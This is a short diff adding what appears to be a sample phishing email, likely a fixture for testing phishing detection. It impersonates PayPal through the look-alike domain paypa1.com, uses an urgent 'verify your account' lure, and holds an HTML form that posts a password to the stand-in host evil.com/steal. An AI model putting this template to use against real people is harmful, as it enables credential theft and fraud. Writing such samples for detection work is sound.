@@ -1,0 +1,14 @@
+From: security@paypa1.com
+Reply-To: attacker@gmail.com
+Subject: Urgent: Verify your account now!
+MIME-Version: 1.0
+Content-Type: text/html
+
+<html>
+<body>
+<p>Dear customer, click <a href="http://192.168.1.1/login">here</a> to update your password.</p>
+<form action="http://evil.com/steal" method="post">
+<input type="text" name="pass">
+</form>
+</body>
+</html>
